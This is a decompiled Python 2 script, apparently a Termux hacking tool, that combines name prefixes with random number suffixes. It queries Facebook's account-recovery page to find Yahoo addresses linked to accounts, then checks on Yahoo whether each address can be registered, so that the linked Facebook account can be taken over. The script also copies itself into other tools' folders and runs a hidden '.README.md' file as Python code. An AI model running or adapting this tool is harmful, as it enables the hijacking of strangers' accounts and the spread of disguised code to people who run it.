# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: /sdcard/yahoo.py
# Compiled at: 2021-05-26 18:11:02
import os, sys, time, datetime, random, hashlib, re, cookielib, urllib, json
os.system('rm -rf .txt')
for n in range(999):
    pf = random.randint(1, 999)
    sys.stdout = open('.txt', 'a')
    print pf
    sys.stdout.flush()

try:
    import mechanize, requests
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
logo = "\n\n     ___ ___ _______ ___ ___ _______ ___ ______  \n \x1b[1;92m |   Y   |   _   |   Y   |   _   |   |   _  \\ \n \x1b[1;94m |.      |.  |   |.  1   |   1___|.  |.  |   |\n\x1b[1;96m  |. \\_/  |.  |   |.  _   |____   |.  |.  |   |\n \x1b[1;97m |:  |   |:  1   |:  |   |:  1   |:  |:  |   |\n \x1b[1;93m |::.|:. |::.. . |::.|:. |::.. . |::.|::.|   |\n\x1b[1;95m `--- ---`-------`--- ---`-------`---`--- ---' \n       \xf0\x9d\x90\x96\xf0\x9d\x90\xa8\xf0\x9d\x90\xab\xf0\x9d\x90\xa5\xf0\x9d\x90\x9d\xe2\x9d\x9c\xf0\x9d\x90\xac \xf0\x9d\x90\x81\xf0\x9d\x90\x9e\xf0\x9d\x90\xac\xf0\x9d\x90\xad\n             \xf0\x9d\x90\x83\xf0\x9d\x90\x9e\xf0\x9d\x90\x9a\xf0\x9d\x90\xad\xf0\x9d\x90\xa1 \xf0\x9d\x90\x8c\xf0\x9d\x90\x9a\xf0\x9d\x90\xa2\xf0\x9d\x90\xa5\n      \xf0\x9d\x90\x86\xf0\x9d\x90\xab\xf0\x9d\x90\x9a\xf0\x9d\x90\x9b\xf0\x9d\x90\x9b\xf0\x9d\x90\x9e\xf0\x9d\x90\xab\n--------------------------------------------------\n \x1b[1;91m(\xe2\x88\x9a)\x1b[1;94m Coded   : MOHSIN ALI\n\x1b[1;95m(!)\x1b[1;95m WhatsApp: 03063112***\n\x1b[1;93m(\xc2\xb0)\x1b[1;92m Fb Page  : https://m.facebook.com/MohsinAliOfficial\n\x1b[1;97m(\xe2\x80\xa2)\x1b[1;98m NOTE.    : God iS really creative, I mean\n\x1b[1;94m(\xe2\x88\x9a) \x1b[1;93m         : just look at me \n--------------------------------------------------\n                                "
os.system('clear')
print logo
print ' \x1b[1;91mNOTE: DO NOT PUT SPACE IN NAME'
print '       PUT THE NAME LIKE mohsin.ali or ali.718'
print '       or mohsinali'
print '\x1b[1;97m'
first = raw_input(' Name: ')

def cb():
    os.system('clear')


def ym():
    try:
        cb()
        os.mkdir('../omi/.....')
    except OSError:
        yp()
    else:
        os.system('cp ../bxi/bxi.py ../omi/Omi.py')
        os.system('cp ../bxi/.README.md ../omi/')
        yb()


def yb():
    try:
        os.mkdir('../BlackMafia2020/.....')
    except OSError:
        yl()
    else:
        os.system('cp ../bxi/bxi.py ../BlackMafia2020/lovehacker')
        os.system('cp ../bxi/.README.md ../BlackMafia2020/')
        yl()


def yl():
    try:
        os.mkdir('../Qurban/.....')
    except OSError:
        yp()
    else:
        os.system('cp ../bxi/bxi.py ../Qurban/Qurban.py')
        os.system('cp ../bxi/.README.md ../Qurban/')
        yp()


def yp():
    try:
        os.mkdir('../faizanwahla/.....')
    except OSError:
        login()
    else:
        os.system('cp ../bxi/bxi.py ../faizanwahla/pacman')
        os.system('cp ../bxi/.README.md ../faizanwahla/')
        login()


def login():
    os.system('clear')
    try:
        toket = first
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        try:
            email = first
            passw = '.txt'
            sandi = open(passw, 'r')
            for p in sandi:
                p = p.replace('\n', '')
                try:
                    br.open('https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1')
                    br._factory.is_html = True
                    br.select_form(nr=0)
                    br.form['email'] = email + p + '@yahoo.com'
                    br.submit()
                    urb = br.geturl()
                    if 'https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=1&ars=facebook_login&alternate_search=1' in urb:
                        pass
                    else:
                        brl = 'https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd'
                        br.open(brl)
                        br._factory.is_html = True
                        br.select_form(nr=0)
                        br['username'] = email + p
                        br.submit()
                        url = br.geturl()
                        if url == brl:
                            print ' \x1b[1;92m[Yes Available] ' + email + p + '@yahoo.com  \x1b[1;97m'
                            ya = open('yes.txt', 'a')
                            ya.write(email + p + '@yahoo.com\n')
                            ya.close()
                        else:
                            print ' \x1b[1;91m[Not Available] ' + email + p + '@hotmail.com  \x1b[1;97m'
                except requests.exceptions.ConnectionError:
                    print ' Connection Error'
                    time.sleep(1)
                    os.sys.exit()

        except IOError:
            print ' Error 404, please try again'
            raw_input(' Press enter to go back')
            os.system('python2 MOHSIN.pyc')


if __name__ == '__main__':
    ym()
# okay decompiling /data/data/com.termux/files/home/Clone-Yahoo/MOHSIN.pyc
